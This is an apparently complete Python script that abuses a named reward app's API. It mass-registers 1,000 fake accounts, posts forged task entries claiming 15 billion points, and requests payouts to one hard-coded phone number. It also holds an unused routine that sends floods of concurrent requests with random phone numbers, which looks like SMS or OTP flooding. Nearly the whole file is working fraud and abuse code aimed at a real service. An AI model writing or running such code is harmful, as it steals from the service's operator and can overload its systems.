import asyncio
import random
import json
import uuid
import aiohttp
from time import time

import random
import string

def generate_random_email():
    domains = ["example.com", "test.com", "random.com"]
    random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    return f"{random_string}@{random.choice(domains)}"

def generate_random_number():
    min_value = 10**7  # Minimum 8-digit number (10 million)
    max_value = (10**8) - 1  # Maximum 8-digit number (99 million)
    return random.randint(min_value, max_value)

async def send_request(url: str, session: aiohttp.ClientSession, params: dict):
    try:
        async with session.get(url, params=params, timeout=5) as response:
            result = await response.text()
            print(f'Read {len(result)} from {url}')
            print(f'Response: {result}')
    except Exception as e:
        print(f'Error for URL {url}: {e}')

async def send_all_requests(urls: list):
    my_conn = aiohttp.TCPConnector(limit=500)  # Increased concurrency limit

    async with aiohttp.ClientSession(connector=my_conn) as session:
        tasks = []
        for url in urls:
            params = {"phone": f"018{generate_random_number()}"}  # Generate a random number for each request
            task = asyncio.create_task(send_request(url=url, session=session, params=params))
            tasks.append(task)
        
        chunk_size = 1000  # Send requests in chunks
        for i in range(0, len(tasks), chunk_size):
            await asyncio.gather(*tasks[i:i + chunk_size], return_exceptions=True)
            print(f'Sent chunk {i//chunk_size + 1}')

async def register_and_get_token(session):
    url = "https://takagorapi.takagor.com/public/api/v1/register-google"
    payload = json.dumps({
        "android_id": str(uuid.uuid4()),  # Generate a random UUID for android_id
        "email": generate_random_email(),
        "name": "Taka chor scamer"
    })
    headers = {
        'User-Agent': "okhttp/5.0.0-alpha.2",
        'Accept-Encoding': "gzip",
        'content-type': "application/json; charset=UTF-8"
    }
    async with session.post(url, data=payload, headers=headers) as response:
        if response.status == 200:
            data = await response.json()
            print(f"Register Response: {data}")
            return data.get("token")
        else:
            print(f"Failed to register: {await response.text()}")
            return None

async def store_task(session, token):
    url = "https://takagorapi.takagor.com/public/api/v1/store-task"
    payload = json.dumps({
        "point": "15000000000",
        "position": "15",
        "task_type": "3"
    })
    headers = {
        'User-Agent': "okhttp/5.0.0-alpha.2",
        'Accept-Encoding': "gzip",
        'authorization': f"Bearer {token}",
        'content-type': "application/json; charset=UTF-8"
    }
    async with session.post(url, data=payload, headers=headers) as response:
        data = await response.text()
        if response.status == 200:
            print(f"Store Task Response: {data}")
        else:
            print(f"Failed to store task: {data}")

async def withdraw_request(session, token):
    url = "https://takagorapi.takagor.com/public/api/v1/withdraw-request"
    payload = json.dumps({
        "account_info": "01729832428",
        "amount": "500",
        "method_id": "3",
        "method_name": "মোবাইল রিচার্জ"
    })
    headers = {
        'User-Agent': "okhttp/5.0.0-alpha.2",
        'Accept-Encoding': "gzip",
        'authorization': f"Bearer {token}",
        'content-type': "application/json; charset=UTF-8"
    }
    async with session.post(url, data=payload, headers=headers) as response:
        data = await response.text()
        if response.status == 200:
            print(f"Withdraw Request Response: {data}")
        else:
            print(f"Failed to withdraw: {data}")

async def register_and_store_task(session):
    token = await register_and_get_token(session)
    if token:
        await store_task(session, token)
        await withdraw_request(session, token)

async def make_requests():
    async with aiohttp.ClientSession() as session:
        tasks = [register_and_store_task(session) for _ in range(1000)]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    start_time = time()
    asyncio.run(make_requests())
    end_time = time()
    print(f"Completed in {end_time - start_time} seconds")
